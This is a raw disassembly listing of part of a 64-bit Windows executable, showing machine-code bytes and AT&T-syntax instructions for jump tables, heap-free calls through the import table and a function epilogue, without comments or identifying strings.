   14000558a:	48 8d 15 1f ea 0d 00 	lea    0xdea1f(%rip),%rdx        # 0x1400e3fb0
   140005591:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140005595:	48 01 d0             	add    %rdx,%rax
   140005598:	ff e0                	jmp    *%rax
   14000559a:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000559e:	eb 2f                	jmp    0x1400055cf
   1400055a0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400055a5:	eb 28                	jmp    0x1400055cf
   1400055a7:	49 8d 46 01          	lea    0x1(%r14),%rax
   1400055ab:	4d 85 f6             	test   %r14,%r14
   1400055ae:	49 0f 44 c6          	cmove  %r14,%rax
   1400055b2:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   1400055b6:	48 83 c1 02          	add    $0x2,%rcx
   1400055ba:	eb 13                	jmp    0x1400055cf
   1400055bc:	49 8d 46 01          	lea    0x1(%r14),%rax
   1400055c0:	4d 85 f6             	test   %r14,%r14
   1400055c3:	49 0f 44 c6          	cmove  %r14,%rax
   1400055c7:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   1400055cb:	48 83 c1 08          	add    $0x8,%rcx
   1400055cf:	48 3b 8d d0 0d 00 00 	cmp    0xdd0(%rbp),%rcx
   1400055d6:	75 0c                	jne    0x1400055e4
   1400055d8:	41 80 fd 05          	cmp    $0x5,%r13b
   1400055dc:	0f 95 c0             	setne  %al
   1400055df:	40 20 f0             	and    %sil,%al
   1400055e2:	89 c6                	mov    %eax,%esi
   1400055e4:	48 8b 8d c0 0d 00 00 	mov    0xdc0(%rbp),%rcx
   1400055eb:	4c 89 e2             	mov    %r12,%rdx
   1400055ee:	e8 2d 28 01 00       	call   0x140017e20
   1400055f3:	84 c0                	test   %al,%al
   1400055f5:	75 7e                	jne    0x140005675
   1400055f7:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   1400055fe:	48 8b 95 c0 0d 00 00 	mov    0xdc0(%rbp),%rdx
   140005605:	4d 89 e0             	mov    %r12,%r8
   140005608:	e8 63 29 01 00       	call   0x140017f70
   14000560d:	0f b6 95 50 08 00 00 	movzbl 0x850(%rbp),%edx
   140005614:	48 8b 8d 60 08 00 00 	mov    0x860(%rbp),%rcx
   14000561b:	48 8b 85 70 08 00 00 	mov    0x870(%rbp),%rax
   140005622:	4c 8d 05 9b e9 0d 00 	lea    0xde99b(%rip),%r8        # 0x1400e3fc4
   140005629:	49 63 14 90          	movslq (%r8,%rdx,4),%rdx
   14000562d:	4c 01 c2             	add    %r8,%rdx
   140005630:	ff e2                	jmp    *%rdx
   140005632:	48 83 c1 04          	add    $0x4,%rcx
   140005636:	eb 34                	jmp    0x14000566c
   140005638:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000563c:	48 85 c0             	test   %rax,%rax
   14000563f:	48 0f 44 d0          	cmove  %rax,%rdx
   140005643:	48 01 d1             	add    %rdx,%rcx
   140005646:	48 83 c1 02          	add    $0x2,%rcx
   14000564a:	eb 20                	jmp    0x14000566c
   14000564c:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005651:	eb 19                	jmp    0x14000566c
   140005653:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140005657:	48 85 c0             	test   %rax,%rax
   14000565a:	48 0f 44 d0          	cmove  %rax,%rdx
   14000565e:	48 01 d1             	add    %rdx,%rcx
   140005661:	48 83 c1 08          	add    $0x8,%rcx
   140005665:	eb 05                	jmp    0x14000566c
   140005667:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000566c:	4c 39 e1             	cmp    %r12,%rcx
   14000566f:	0f 87 fd 12 00 00    	ja     0x140006972
   140005675:	31 c0                	xor    %eax,%eax
   140005677:	48 89 85 a0 0c 00 00 	mov    %rax,0xca0(%rbp)
   14000567e:	48 8d 8d 90 0c 00 00 	lea    0xc90(%rbp),%rcx
   140005685:	48 8b 95 c0 0d 00 00 	mov    0xdc0(%rbp),%rdx
   14000568c:	4d 89 e0             	mov    %r12,%r8
   14000568f:	e8 9c 65 01 00       	call   0x14001bc30
   140005694:	48 8b bd 90 0c 00 00 	mov    0xc90(%rbp),%rdi
   14000569b:	48 8b 95 98 0c 00 00 	mov    0xc98(%rbp),%rdx
   1400056a2:	48 8b 9d a0 0c 00 00 	mov    0xca0(%rbp),%rbx
   1400056a9:	4c 8b b5 a8 0c 00 00 	mov    0xca8(%rbp),%r14
   1400056b0:	c7 85 50 08 00 00 00 	movl   $0x0,0x850(%rbp)
   1400056b7:	00 00 00 
   1400056ba:	48 c7 85 58 08 00 00 	movq   $0x0,0x858(%rbp)
   1400056c1:	00 00 00 00 
   1400056c5:	c7 85 60 08 00 00 07 	movl   $0x7,0x860(%rbp)
   1400056cc:	00 00 00 
   1400056cf:	48 c7 85 64 08 00 00 	movq   $0x0,0x864(%rbp)
   1400056d6:	00 00 00 00 
   1400056da:	48 c7 85 69 08 00 00 	movq   $0x0,0x869(%rbp)
   1400056e1:	00 00 00 00 
   1400056e5:	c6 85 69 08 00 00 01 	movb   $0x1,0x869(%rbp)
   1400056ec:	c6 85 6c 08 00 00 01 	movb   $0x1,0x86c(%rbp)
   1400056f3:	c6 85 6b 08 00 00 01 	movb   $0x1,0x86b(%rbp)
   1400056fa:	48 8d 8d 30 0d 00 00 	lea    0xd30(%rbp),%rcx
   140005701:	48 89 95 e8 0d 00 00 	mov    %rdx,0xde8(%rbp)
   140005708:	49 89 d8             	mov    %rbx,%r8
   14000570b:	e8 e0 4d 01 00       	call   0x14001a4f0
   140005710:	48 8b 85 30 0d 00 00 	mov    0xd30(%rbp),%rax
   140005717:	4c 8b ad 38 0d 00 00 	mov    0xd38(%rbp),%r13
   14000571e:	48 89 c1             	mov    %rax,%rcx
   140005721:	48 f7 d9             	neg    %rcx
   140005724:	70 49                	jo     0x14000576f
   140005726:	48 8b 8d 40 0d 00 00 	mov    0xd40(%rbp),%rcx
   14000572d:	48 89 85 d0 03 00 00 	mov    %rax,0x3d0(%rbp)
   140005734:	4c 89 ad d8 03 00 00 	mov    %r13,0x3d8(%rbp)
   14000573b:	48 89 8d e0 03 00 00 	mov    %rcx,0x3e0(%rbp)
   140005742:	48 8d 8d 70 0d 00 00 	lea    0xd70(%rbp),%rcx
   140005749:	48 8d 95 d0 03 00 00 	lea    0x3d0(%rbp),%rdx
   140005750:	e8 ab 5a 01 00       	call   0x14001b200
   140005755:	48 8b 8d 70 0d 00 00 	mov    0xd70(%rbp),%rcx
   14000575c:	4c 8b ad 78 0d 00 00 	mov    0xd78(%rbp),%r13
   140005763:	48 89 c8             	mov    %rcx,%rax
   140005766:	48 f7 d8             	neg    %rax
   140005769:	0f 81 93 02 00 00    	jno    0x140005a02
   14000576f:	be 01 00 00 00       	mov    $0x1,%esi
   140005774:	48 89 bd d0 0d 00 00 	mov    %rdi,0xdd0(%rbp)
   14000577b:	40 f6 c6 01          	test   $0x1,%sil
   14000577f:	74 0c                	je     0x14000578d
   140005781:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   140005788:	e9 5b 01 00 00       	jmp    0x1400058e8
   14000578d:	4c 89 b5 b8 0c 00 00 	mov    %r14,0xcb8(%rbp)
   140005794:	48 89 9d 00 0d 00 00 	mov    %rbx,0xd00(%rbp)
   14000579b:	4c 89 ad e0 0d 00 00 	mov    %r13,0xde0(%rbp)
   1400057a2:	4c 89 ad 00 08 00 00 	mov    %r13,0x800(%rbp)
   1400057a9:	41 bf 00 e6 0b 00    	mov    $0xbe600,%r15d
   1400057af:	4c 8d a5 00 08 00 00 	lea    0x800(%rbp),%r12
   1400057b6:	48 8d 35 bb e8 0d 00 	lea    0xde8bb(%rip),%rsi        # 0x1400e4078
   1400057bd:	48 8b 3d 0c bb 01 00 	mov    0x1bb0c(%rip),%rdi        # 0x1400212d0
   1400057c4:	48 8b 1d fd ba 01 00 	mov    0x1bafd(%rip),%rbx        # 0x1400212c8
   1400057cb:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   1400057d2:	eb 25                	jmp    0x1400057f9
   1400057d4:	4c 89 e8             	mov    %r13,%rax
   1400057d7:	48 c1 e8 20          	shr    $0x20,%rax
   1400057db:	83 f8 23             	cmp    $0x23,%eax
   1400057de:	0f 85 e7 00 00 00    	jne    0x1400058cb
   1400057e4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400057eb:	00 00 00 00 00 
   1400057f0:	4d 85 ff             	test   %r15,%r15
   1400057f3:	0f 84 8b 02 00 00    	je     0x140005a84
   1400057f9:	4c 89 e1             	mov    %r12,%rcx
   1400057fc:	4c 89 f2             	mov    %r14,%rdx
   1400057ff:	4d 89 f8             	mov    %r15,%r8
   140005802:	e8 49 3d 01 00       	call   0x140019550
   140005807:	49 89 d5             	mov    %rdx,%r13
   14000580a:	a8 01                	test   $0x1,%al
   14000580c:	74 22                	je     0x140005830
   14000580e:	44 89 e8             	mov    %r13d,%eax
   140005811:	83 e0 03             	and    $0x3,%eax
   140005814:	48 63 04 86          	movslq (%rsi,%rax,4),%rax
   140005818:	48 01 f0             	add    %rsi,%rax
   14000581b:	ff e0                	jmp    *%rax
   14000581d:	41 80 7d 10 23       	cmpb   $0x23,0x10(%r13)
   140005822:	74 cc                	je     0x1400057f0
   140005824:	e9 50 05 00 00       	jmp    0x140005d79
   140005829:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005830:	4d 85 ed             	test   %r13,%r13
   140005833:	0f 84 39 05 00 00    	je     0x140005d72
   140005839:	4c 89 f8             	mov    %r15,%rax
   14000583c:	4c 29 e8             	sub    %r13,%rax
   14000583f:	0f 82 8c 10 00 00    	jb     0x1400068d1
   140005845:	4d 01 ee             	add    %r13,%r14
   140005848:	49 89 c7             	mov    %rax,%r15
   14000584b:	eb a3                	jmp    0x1400057f0
   14000584d:	41 80 7d 0f 23       	cmpb   $0x23,0xf(%r13)
   140005852:	0f 85 21 05 00 00    	jne    0x140005d79
   140005858:	49 8d 45 ff          	lea    -0x1(%r13),%rax
   14000585c:	48 89 85 c8 0c 00 00 	mov    %rax,0xcc8(%rbp)
   140005863:	49 8b 45 ff          	mov    -0x1(%r13),%rax
   140005867:	48 89 85 08 0d 00 00 	mov    %rax,0xd08(%rbp)
   14000586e:	49 8b 45 07          	mov    0x7(%r13),%rax
   140005872:	48 89 85 10 0d 00 00 	mov    %rax,0xd10(%rbp)
   140005879:	48 8b 00             	mov    (%rax),%rax
   14000587c:	48 85 c0             	test   %rax,%rax
   14000587f:	74 09                	je     0x14000588a
   140005881:	48 8b 8d 08 0d 00 00 	mov    0xd08(%rbp),%rcx
   140005888:	ff d0                	call   *%rax
   14000588a:	4c 8b ad 08 0d 00 00 	mov    0xd08(%rbp),%r13
   140005891:	48 8b 85 10 0d 00 00 	mov    0xd10(%rbp),%rax
   140005898:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
   14000589d:	74 17                	je     0x1400058b6
   14000589f:	48 83 78 10 11       	cmpq   $0x11,0x10(%rax)
   1400058a4:	72 04                	jb     0x1400058aa
   1400058a6:	4d 8b 6d f8          	mov    -0x8(%r13),%r13
   1400058aa:	ff d7                	call   *%rdi
   1400058ac:	48 89 c1             	mov    %rax,%rcx
   1400058af:	31 d2                	xor    %edx,%edx
   1400058b1:	4d 89 e8             	mov    %r13,%r8
   1400058b4:	ff d3                	call   *%rbx
   1400058b6:	ff d7                	call   *%rdi
   1400058b8:	48 89 c1             	mov    %rax,%rcx
   1400058bb:	31 d2                	xor    %edx,%edx
   1400058bd:	4c 8b 85 c8 0c 00 00 	mov    0xcc8(%rbp),%r8
   1400058c4:	ff d3                	call   *%rbx
   1400058c6:	e9 25 ff ff ff       	jmp    0x1400057f0
   1400058cb:	48 8b 8d e0 0d 00 00 	mov    0xde0(%rbp),%rcx
   1400058d2:	ff 15 d0 b9 01 00    	call   *0x1b9d0(%rip)        # 0x1400212a8
   1400058d8:	4d 85 ed             	test   %r13,%r13
   1400058db:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   1400058e2:	0f 84 b0 01 00 00    	je     0x140005a98
   1400058e8:	44 89 e8             	mov    %r13d,%eax
   1400058eb:	83 e0 03             	and    $0x3,%eax
   1400058ee:	83 f8 01             	cmp    $0x1,%eax
   1400058f1:	0f 84 59 01 00 00    	je     0x140005a50
   1400058f7:	48 83 bd d0 0d 00 00 	cmpq   $0x0,0xdd0(%rbp)
   1400058fe:	00 
   1400058ff:	74 18                	je     0x140005919
   140005901:	ff 15 c9 b9 01 00    	call   *0x1b9c9(%rip)        # 0x1400212d0
   140005907:	48 89 c1             	mov    %rax,%rcx
   14000590a:	31 d2                	xor    %edx,%edx
   14000590c:	4c 8b 85 e8 0d 00 00 	mov    0xde8(%rbp),%r8
   140005913:	ff 15 af b9 01 00    	call   *0x1b9af(%rip)        # 0x1400212c8
   140005919:	80 bd f8 0c 00 00 00 	cmpb   $0x0,0xcf8(%rbp)
   140005920:	48 8b 9d c0 0c 00 00 	mov    0xcc0(%rbp),%rbx
   140005927:	75 18                	jne    0x140005941
   140005929:	ff 15 a1 b9 01 00    	call   *0x1b9a1(%rip)        # 0x1400212d0
   14000592f:	48 89 c1             	mov    %rax,%rcx
   140005932:	31 d2                	xor    %edx,%edx
   140005934:	4c 8b 85 c0 0d 00 00 	mov    0xdc0(%rbp),%r8
   14000593b:	ff 15 87 b9 01 00    	call   *0x1b987(%rip)        # 0x1400212c8
   140005941:	48 83 bd d0 0c 00 00 	cmpq   $0x0,0xcd0(%rbp)
   140005948:	00 
   140005949:	74 18                	je     0x140005963
   14000594b:	ff 15 7f b9 01 00    	call   *0x1b97f(%rip)        # 0x1400212d0
   140005951:	48 89 c1             	mov    %rax,%rcx
   140005954:	31 d2                	xor    %edx,%edx
   140005956:	4c 8b 85 20 0d 00 00 	mov    0xd20(%rbp),%r8
   14000595d:	ff 15 65 b9 01 00    	call   *0x1b965(%rip)        # 0x1400212c8
   140005963:	0f b6 05 96 36 0e 00 	movzbl 0xe3696(%rip),%eax        # 0x1400e9000
   14000596a:	48 8b 35 5f b9 01 00 	mov    0x1b95f(%rip),%rsi        # 0x1400212d0
   140005971:	ff d6                	call   *%rsi
   140005973:	48 8b 3d 4e b9 01 00 	mov    0x1b94e(%rip),%rdi        # 0x1400212c8
   14000597a:	48 89 c1             	mov    %rax,%rcx
   14000597d:	31 d2                	xor    %edx,%edx
   14000597f:	4d 89 f0             	mov    %r14,%r8
   140005982:	ff d7                	call   *%rdi
   140005984:	ff d6                	call   *%rsi
   140005986:	48 89 c1             	mov    %rax,%rcx
   140005989:	31 d2                	xor    %edx,%edx
   14000598b:	49 89 d8             	mov    %rbx,%r8
   14000598e:	ff d7                	call   *%rdi
   140005990:	ff d6                	call   *%rsi
   140005992:	48 89 c1             	mov    %rax,%rcx
   140005995:	31 d2                	xor    %edx,%edx
   140005997:	4c 8b 85 f8 07 00 00 	mov    0x7f8(%rbp),%r8
   14000599e:	ff d7                	call   *%rdi
   1400059a0:	0f 28 b5 00 0e 00 00 	movaps 0xe00(%rbp),%xmm6
   1400059a7:	0f 28 bd 10 0e 00 00 	movaps 0xe10(%rbp),%xmm7
   1400059ae:	44 0f 28 85 20 0e 00 	movaps 0xe20(%rbp),%xmm8
   1400059b5:	00 
   1400059b6:	44 0f 28 8d 30 0e 00 	movaps 0xe30(%rbp),%xmm9
   1400059bd:	00 
   1400059be:	44 0f 28 95 40 0e 00 	movaps 0xe40(%rbp),%xmm10
   1400059c5:	00 
   1400059c6:	44 0f 28 9d 50 0e 00 	movaps 0xe50(%rbp),%xmm11
   1400059cd:	00 
   1400059ce:	44 0f 28 a5 60 0e 00 	movaps 0xe60(%rbp),%xmm12
   1400059d5:	00 
   1400059d6:	44 0f 28 ad 70 0e 00 	movaps 0xe70(%rbp),%xmm13
   1400059dd:	00 
   1400059de:	44 0f 28 b5 80 0e 00 	movaps 0xe80(%rbp),%xmm14
   1400059e5:	00 
   1400059e6:	44 0f 28 bd 90 0e 00 	movaps 0xe90(%rbp),%xmm15
   1400059ed:	00 
   1400059ee:	48 81 c4 28 0f 00 00 	add    $0xf28,%rsp
   1400059f5:	5b                   	pop    %rbx
   1400059f6:	5f                   	pop    %rdi
   1400059f7:	5e                   	pop    %rsi
   1400059f8:	41 5c                	pop    %r12
   1400059fa:	41 5d                	pop    %r13
   1400059fc:	41 5e                	pop    %r14
   1400059fe:	41 5f                	pop    %r15
   140005a00:	5d                   	pop    %rbp
   140005a01:	c3                   	ret
   140005a02:	48 89 8d d0 0d 00 00 	mov    %rcx,0xdd0(%rbp)
   140005a09:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140005a10:	4c 89 ad e0 0d 00 00 	mov    %r13,0xde0(%rbp)
   140005a17:	4c 89 e9             	mov    %r13,%rcx
   140005a1a:	e8 f1 5d 01 00       	call   0x14001b810
   140005a1f:	48 89 c6             	mov    %rax,%rsi
   140005a22:	49 89 d5             	mov    %rdx,%r13
   140005a25:	48 83 bd d0 0d 00 00 	cmpq   $0x0,0xdd0(%rbp)
   140005a2c:	00 
   140005a2d:	0f 84 41 fd ff ff    	je     0x140005774
   140005a33:	ff 15 97 b8 01 00    	call   *0x1b897(%rip)        # 0x1400212d0
   140005a39:	48 89 c1             	mov    %rax,%rcx
   140005a3c:	31 d2                	xor    %edx,%edx
   140005a3e:	4c 8b 85 e0 0d 00 00 	mov    0xde0(%rbp),%r8
   140005a45:	ff 15 7d b8 01 00    	call   *0x1b87d(%rip)        # 0x1400212c8
   140005a4b:	e9 24 fd ff ff       	jmp    0x140005774
   140005a50:	49 8b 75 ff          	mov    -0x1(%r13),%rsi
   140005a54:	49 8b 7d 07          	mov    0x7(%r13),%rdi
   140005a58:	48 8b 07             	mov    (%rdi),%rax
   140005a5b:	48 85 c0             	test   %rax,%rax
   140005a5e:	74 05                	je     0x140005a65
   140005a60:	48 89 f1             	mov    %rsi,%rcx
   140005a63:	ff d0                	call   *%rax
   140005a65:	49 ff cd             	dec    %r13
   140005a68:	48 83 7f 08 00       	cmpq   $0x0,0x8(%rdi)
   140005a6d:	0f 84 94 01 00 00    	je     0x140005c07
   140005a73:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   140005a77:	48 89 f1             	mov    %rsi,%rcx
   140005a7a:	e8 61 89 00 00       	call   0x14000e3e0
   140005a7f:	e9 83 01 00 00       	jmp    0x140005c07
   140005a84:	48 8b 8d e0 0d 00 00 	mov    0xde0(%rbp),%rcx
   140005a8b:	ff 15 17 b8 01 00    	call   *0x1b817(%rip)        # 0x1400212a8
   140005a91:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   140005a98:	48 8d 8d 30 0d 00 00 	lea    0xd30(%rbp),%rcx
   140005a9f:	48 8b 95 e8 0d 00 00 	mov    0xde8(%rbp),%rdx
   140005aa6:	4c 8b 85 00 0d 00 00 	mov    0xd00(%rbp),%r8
   140005aad:	e8 fe 44 00 00       	call   0x140009fb0
   140005ab2:	48 8b bd 30 0d 00 00 	mov    0xd30(%rbp),%rdi
   140005ab9:	48 8b b5 38 0d 00 00 	mov    0xd38(%rbp),%rsi
   140005ac0:	4c 8b 85 40 0d 00 00 	mov    0xd40(%rbp),%r8
   140005ac7:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   140005ace:	48 89 f2             	mov    %rsi,%rdx
   140005ad1:	e8 ba 4b 00 00       	call   0x14000a690
   140005ad6:	31 c0                	xor    %eax,%eax
   140005ad8:	48 3b 85 d0 03 00 00 	cmp    0x3d0(%rbp),%rax
   140005adf:	0f 81 a4 0e 00 00    	jno    0x140006989
   140005ae5:	4c 8b ad d8 03 00 00 	mov    0x3d8(%rbp),%r13
   140005aec:	4c 8b bd e0 03 00 00 	mov    0x3e0(%rbp),%r15
   140005af3:	48 d1 e7             	shl    $1,%rdi
   140005af6:	48 85 ff             	test   %rdi,%rdi
   140005af9:	74 14                	je     0x140005b0f
   140005afb:	ff 15 cf b7 01 00    	call   *0x1b7cf(%rip)        # 0x1400212d0
